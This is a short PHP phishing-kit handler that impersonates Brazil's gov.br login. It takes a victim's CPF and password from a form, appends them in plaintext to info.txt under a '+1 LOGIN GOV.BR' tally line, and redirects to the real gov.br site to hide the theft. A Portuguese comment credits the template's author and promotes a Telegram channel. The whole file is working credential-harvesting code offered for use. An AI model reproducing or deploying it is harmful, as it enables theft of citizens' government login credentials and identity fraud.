<?php
session_start();

$cpf = $_POST['cpf'] ?? '';
$password = $_POST['password'] ?? '';

if (!empty($cpf)) {
    $texto = "+1 LOGIN GOV.BR \n"; 
    $conteudo = $texto . "CPF: $cpf \nSenha: $password \n\n";
    file_put_contents('info.txt', $conteudo, FILE_APPEND); 

    $_SESSION['cpf'] = $cpf;
}

header("Location: https://www.gov.br/pt-br");
exit();

//// foi pego o modelo do meu mano duck entt passa no canal dele ai, TMJ https://t.me/duckettstoneprincipal
?>

